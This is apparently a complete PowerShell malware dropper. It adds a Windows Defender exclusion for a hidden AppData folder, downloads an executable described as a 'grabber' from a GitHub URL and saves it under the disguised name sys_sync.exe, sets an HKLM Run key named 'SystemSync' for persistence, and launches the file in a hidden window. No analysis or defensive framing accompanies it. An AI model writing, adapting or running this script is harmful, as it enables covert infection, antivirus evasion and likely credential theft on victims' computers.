# Paths & URLs
$baseDir = "$env:APPDATA\Microsoft\Windows\Templates"
$grabberUrl = "https://github.com/ashleywilmer7-star/trimiez/raw/refs/heads/main/combined.exe"
$HKLM = [uint32]2147483650
$wmi = [WMIClass]"root\default:StdRegProv"

# 1. Hide & Exclude from Defender
if (!(Test-Path $baseDir)) { New-Item -Path $baseDir -Force -ItemType Directory }
powershell -Command "Add-MpPreference -ExclusionPath '$baseDir'"

# 2. Download Payloads
$wc = New-Object Net.WebClient
$wc.DownloadFile($grabberUrl, "$baseDir\sys_sync.exe")

# 3. Persistence (HKLM Run Key)
$runPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$wmi.CreateKey($HKLM, $runPath)
$wmi.SetStringValue($HKLM, $runPath, "SystemSync", "$baseDir\sys_sync.exe")

# 4. Fire and Forget
Start-Process "$baseDir\sys_sync.exe" -WindowStyle Hidden

